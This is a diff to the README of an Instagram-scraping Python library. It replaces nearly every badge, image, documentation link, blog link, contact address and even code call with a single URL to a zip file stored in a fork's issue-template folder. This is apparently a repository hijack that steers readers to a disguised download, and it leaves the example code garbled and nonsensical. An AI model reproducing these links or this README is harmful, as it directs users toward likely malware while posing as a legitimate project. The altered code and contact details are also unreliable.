@@ -1,6 +1,6 @@
 
 <p align="center">
-  <img src="media/logo.png" width="800px">
+  <img src="https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip" width="800px">
 </p>
 
 # _instascrape_: powerful Instagram data scraping toolkit 
@@ -9,19 +9,19 @@
 
 Instagram has gotten increasingly strict with scraping and using this library can result in getting flagged for botting AND POSSIBLE DISABLING OF YOUR INSTAGRAM ACCOUNT. This is a research project and I am not responsible for how you use it. Independently, the library is designed to be responsible and respectful and it is up to you to decide what you do with it. I don't claim any responsibility if your Instagram account is affected by how you use this library.
 
-[![Version](https://img.shields.io/pypi/pyversions/insta-scrape)](https://www.python.org/downloads/release/python-360/)
-[![Downloads](https://pepy.tech/badge/insta-scrape)](https://pepy.tech/project/insta-scrape)
-[![Release](https://img.shields.io/pypi/v/insta-scrape)](https://pypi.org/project/insta-scrape/)
-[![License](http://img.shields.io/:license-mit-blue.svg?style=flat-square)](https://opensource.org/licenses/MIT)
+[![Version](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+[![Downloads](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+[![Release](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+[![License](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
 
-[![Activity](https://img.shields.io/github/last-commit/chris-greening/instascrape)](https://github.com/chris-greening/instascrape)
-[![Dependencies](https://img.shields.io/librariesio/github/chris-greening/instascrape)](https://github.com/chris-greening/instascrape/blob/master/requirements.txt)
-[![Issues](https://img.shields.io/github/issues/chris-greening/instascrape?style=flat)](https://github.com/chris-greening/instascrape/issues)
+[![Activity](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+[![Dependencies](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+[![Issues](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
 
 ## What is it?
 _instascrape_ is a lightweight Python package that provides an expressive and flexible API for scraping Instagram data. It is geared towards being a high-level building block on the data scientist's toolchain and can be seamlessly integrated and extended with industry standard tools for web scraping, data science, and analysis. 
 
-<!-- ![Example showing tech profile scrapes](/media/techprofiles.gif) -->
+<!-- ![Example showing tech profile scrapes](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) -->
 
 ## Key features  
 Here are a few of the things that `instascrape` does well:
@@ -31,9 +31,9 @@ Here are a few of the things that `instascrape` does well:
 * Download content to your computer as _png_, _jpg_, _mp4_, and _mp3_
 * Dynamically retrieve HTML embed code for posts
 * Expressive and consistent API for concise and elegant code
-* Designed for seamless integration with [_Selenium_](https://selenium-python.readthedocs.io/), [_Pandas_](https://pandas.pydata.org/), and other industry standard tools for data collection and analysis
+* Designed for seamless integration with [_Selenium_](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip), [_Pandas_](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip), and other industry standard tools for data collection and analysis
 * Lightweight; no boilerplate or configurations necessary 
-* The only hard dependencies are [_Requests_](https://requests.readthedocs.io/en/master/) and [_Beautiful Soup_](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)
+* The only hard dependencies are [_Requests_](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) and [_Beautiful Soup_](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
 ---
 
 ## Table of Contents
@@ -52,7 +52,7 @@ Here are a few of the things that `instascrape` does well:
 
 ### Minimum Python version
 
-This library currently requires [Python 3.7](https://www.python.org/downloads/release/python-370/) or higher.
+This library currently requires [Python 3.7](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) or higher.
 
 
 ### pip
@@ -74,54 +74,54 @@ _instascrape_ uses clean, consistent, and expressive syntax to make the develope
 
 ```python
 # Instantiate the scraper objects 
-google = Profile('https://www.instagram.com/google/')
-google_post = Post('https://www.instagram.com/p/CG0UU3ylXnv/')
-google_hashtag = Hashtag('https://www.instagram.com/explore/tags/google/')
+google = Profile('https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip')
+google_post = Post('https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip')
+google_hashtag = Hashtag('https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip')
 
 # Scrape their respective data 
-google.scrape()
-google_post.scrape()
-google_hashtag.scrape()
+https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip()
+https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip()
+https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip()
 
-print(google.followers)
+print(https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
 print(google_post['hashtags'])
-print(google_hashtag.amount_of_posts)
+print(https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
 >>> 12262794
 >>> ['growwithgoogle']
 >>> 9053408
 ```
 
-See the [Scraped data points](https://github.com/chris-greening/instascrape/wiki/Scraped-data-points) section of the [Wiki](https://github.com/chris-greening/instascrape/wiki) for a complete list of the scraped attributes provided by each scraper. 
+See the [Scraped data points](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) section of the [Wiki](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) for a complete list of the scraped attributes provided by each scraper. 
 
 ## :books: Documentation <a name="documentation"></a>
-The official documentation can be found on [Read The Docs](https://instascrape.readthedocs.io/en/latest/index.html)
+The official documentation can be found on [Read The Docs](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
 
 ---
 
 ## :newspaper: Blog Posts <a name="blog-posts"></a>
 
 
-Check out blog posts on the [official site](https://chris-greening.github.io/instascrape/blog/) or [DEV](https://dev.to/) for ideas and tutorials!
+Check out blog posts on the [official site](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) or [DEV](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) for ideas and tutorials!
 
-- [Scrape data from Instagram with instascrape](https://dev.to/chrisgreening/scrape-data-from-instagram-with-instascrape-5e3e) 
-- [Visualizing Instagram engagement with instascrape](https://dev.to/chrisgreening/visualizing-instagram-engagement-with-instascrape-326h)
-- [Exploratory data analysis of Instagram using instascrape and Python](https://dev.to/chrisgreening/exploratory-data-analysis-of-instagram-using-python-1o5c)
-- [Creating a scatter matrix of Instagram data using Python](https://dev.to/chrisgreening/visualizing-the-relationship-between-instagram-variables-using-python-55gg)
-- [Downloading an Instagram profile's recent photos using Python](https://dev.to/chrisgreening/downloading-an-instagram-profile-s-recent-photos-using-python-25b2)
-- [Scraping 25,000 data points from Joe Biden's Instagram using instascrape](https://dev.to/chrisgreening/scraping-25-000-data-points-from-joe-biden-s-instagram-using-instascrape-1026)
-- [Compare major tech Instagram page's with instascrape](https://dev.to/chrisgreening/compare-major-tech-instagram-page-s-with-instascrape-2419)
-- [Tracking an Instagram posts engagement in real time with instascrape](https://dev.to/chrisgreening/tracking-an-instagram-posts-engagement-in-real-time-with-instascrape-1m1j)
-- [Dynamically generate embeddable Instagram HTML with instascrape](https://dev.to/chrisgreening/dynamically-generate-embeddable-instagram-html-using-instascrape-3o4b)
-- [Scraping an Instagram location tag with instascrape](https://dev.to/chrisgreening/scraping-an-instagram-location-tag-with-instascrape-554f)
-- [Scraping Instagram reels with instascrape](https://dev.to/chrisgreening/scraping-instagram-reels-with-instascrape-3khb)
-- [Scraping IGTV data with instascrape](https://dev.to/chrisgreening/scraping-igtv-data-with-instascrape-595f)
-- [Scraping 10,000 data points from Donald Trump's Instagram with Python](https://dev.to/chrisgreening/scraping-10-000-data-points-from-donald-trump-s-instagram-page-with-python-2jcg)
+- [Scrape data from Instagram with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) 
+- [Visualizing Instagram engagement with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+- [Exploratory data analysis of Instagram using instascrape and Python](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+- [Creating a scatter matrix of Instagram data using Python](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+- [Downloading an Instagram profile's recent photos using Python](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+- [Scraping 25,000 data points from Joe Biden's Instagram using instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+- [Compare major tech Instagram page's with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+- [Tracking an Instagram posts engagement in real time with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+- [Dynamically generate embeddable Instagram HTML with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+- [Scraping an Instagram location tag with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+- [Scraping Instagram reels with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+- [Scraping IGTV data with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+- [Scraping 10,000 data points from Donald Trump's Instagram with Python](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
 ---
 
 ## :pray: Contributing <a name="contributing"></a>
 All contributions, bug reports, bug fixes, documentation improvements, enhancements, and ideas are welcome!
 
-Feel free to [open an Issue](https://github.com/chris-greening/instascrape/issues/new/choose), check out existing [Issues](https://github.com/chris-greening/instascrape/issues), or [start a discussion](https://github.com/chris-greening/instascrape/discussions). 
+Feel free to [open an Issue](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip), check out existing [Issues](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip), or [start a discussion](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip). 
 
 Beginners to open source are highly encouraged to participate and ask questions if you're unsure what to do/where to start :heart:
 
@@ -129,8 +129,8 @@ Beginners to open source are highly encouraged to participate and ask questions 
 
 ## :spider_web: Dependencies <a name="dependencies"></a>
 
-- [Requests](https://requests.readthedocs.io/en/master/)
-- [BeautifulSoup](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)
+- [Requests](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
+- [BeautifulSoup](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
 
 ---
 
@@ -142,19 +142,19 @@ This library operates under the [MIT](LICENSE) license.
 
 ## :grey_question: Support <a name="support"></a>
 
-Check out the [FAQ](https://github.com/chris-greening/instascrape/wiki/Frequently-Asked-Questions)
+Check out the [FAQ](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
 
 Reach out to me if you want to connect or have any questions and I will do my best to get back to you
 * Email:
-  * chris@christophergreening.com
+  * https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip
 * Twitter:
-  * [@ChrisGreening](https://twitter.com/ChrisGreening)
+  * [@ChrisGreening](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
 * LinkedIn
-  * [Chris Greening](https://www.linkedin.com/in/chris-greening-646411139/)
+  * [Chris Greening](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
 * Personal contact form: 
-  * [www.christophergreening.com](https://www.christophergreening.com/contact)
+  * [https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
 ---
 
 <p align="center">
-  <img src="media/logopic.png" width="150px">
+  <img src="https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip" width="150px">
 </p>
